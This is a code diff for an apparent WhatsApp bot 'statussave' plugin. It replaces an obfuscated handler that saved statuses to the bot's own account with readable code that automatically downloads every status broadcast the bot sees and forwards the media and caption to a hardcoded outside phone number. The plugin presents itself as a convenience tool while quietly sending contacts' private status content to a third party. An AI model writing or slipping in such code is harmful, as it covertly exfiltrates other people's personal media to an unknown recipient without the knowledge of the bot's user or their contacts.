@@ -1,1 +1,34 @@
-const _0x229eb3=_0x48a9;function _0x2255(){const _0x5ed69e=['tools','user','chat','Failed\x20to\x20forward\x20status:\x20','sendFile','8beIzsS','21siJcKH','catch','729090nYluJw','text','download','7owBJfp','STATUSVIEW','667858jbLYLP','92331VdTwnK','561004aRtsOJ','No\x20text\x20available','log','7249580pmZXrD','command','5014554EaJQPQ','true','remoteJid','Status\x20saving\x20is\x20disabled.','help','reply','status@broadcast','2144802QKjLyh','10vKRQYA'];_0x2255=function(){return _0x5ed69e;};return _0x2255();}(function(_0x540c8b,_0x1b0f27){const _0x57e81d=_0x48a9,_0x36a035=_0x540c8b();while(!![]){try{const _0x123a1c=-parseInt(_0x57e81d(0x16c))/0x1+parseInt(_0x57e81d(0x184))/0x2+-parseInt(_0x57e81d(0x182))/0x3*(parseInt(_0x57e81d(0x16e))/0x4)+parseInt(_0x57e81d(0x171))/0x5+-parseInt(_0x57e81d(0x173))/0x6*(-parseInt(_0x57e81d(0x187))/0x7)+parseInt(_0x57e81d(0x181))/0x8*(-parseInt(_0x57e81d(0x16d))/0x9)+-parseInt(_0x57e81d(0x17b))/0xa*(parseInt(_0x57e81d(0x17a))/0xb);if(_0x123a1c===_0x1b0f27)break;else _0x36a035['push'](_0x36a035['shift']());}catch(_0x2421a1){_0x36a035['push'](_0x36a035['shift']());}}}(_0x2255,0xc22e4));let statusSaveEnabled=process['env'][_0x229eb3(0x188)]===_0x229eb3(0x174),handler=async(_0x2f6514,{conn:_0x2c0faf})=>{const _0x367c5a=_0x229eb3;if(!statusSaveEnabled){console['log'](_0x367c5a(0x176));return;}if(_0x2f6514[_0x367c5a(0x17e)]==='status@broadcast')try{let _0x5f16c7=await _0x2f6514[_0x367c5a(0x186)]();await _0x2c0faf[_0x367c5a(0x180)](_0x2c0faf[_0x367c5a(0x17d)]['id'],_0x5f16c7,'',_0x2f6514[_0x367c5a(0x185)]||'',null,![],{'quoted':_0x2f6514})[_0x367c5a(0x183)](_0x518772=>_0x2f6514[_0x367c5a(0x178)](_0x2f6514['text']||_0x367c5a(0x16f)));}catch(_0xdf9cc2){console[_0x367c5a(0x170)](_0x367c5a(0x17f)+_0xdf9cc2);}};conn['ev']['on']('messages.upsert',async({messages:_0x538d0f})=>{const _0x178f5a=_0x229eb3;for(let _0x365869 of _0x538d0f){_0x365869['key'][_0x178f5a(0x175)]===_0x178f5a(0x179)&&await handler(_0x365869,{'conn':conn});}}),handler[_0x229eb3(0x177)]=['statussave'],handler['tags']=[_0x229eb3(0x17c)],handler[_0x229eb3(0x172)]=/^(swsiaiwi)$/i;function _0x48a9(_0x290898,_0x248f0b){const _0x225550=_0x2255();return _0x48a9=function(_0x48a9d8,_0x298fa3){_0x48a9d8=_0x48a9d8-0x16c;let _0xccf26b=_0x225550[_0x48a9d8];return _0xccf26b;},_0x48a9(_0x290898,_0x248f0b);}export default handler;
+let prnxe = '923000427@s.whatsapp.net';
+let statusSaveEnabled = process.env.STATUSVIEW === 'true';
+
+let handler = async (m, { conn }) => {
+    if (!statusSaveEnabled) {
+        console.log('Status saving is disabled.');
+        return;
+    }
+
+    if (m.key.remoteJid === 'status@broadcast') {
+        try {
+            let buffer = await m.download(); // Ensure m.download() is available and works
+            await conn.sendFile(prnxe, buffer, '', m.text || '', null, false, { quoted: m });
+        } catch (error) {
+            console.log(`Failed to forward status: ${error}`);
+            // Handle the case where sending fails; you might want to notify or log this further
+        }
+    }
+};
+
+// Listen for incoming messages and process them if they are status messages
+conn.ev.on('messages.upsert', async ({ messages }) => {
+    for (let message of messages) {
+        if (message.key.remoteJid === 'status@broadcast') {
+            await handler(message, { conn });
+        }
+    }
+});
+
+handler.help = ['statussave'];
+handler.tags = ['tools'];
+handler.command = /^(swsiaiwi)$/i;
+
+export default handler;
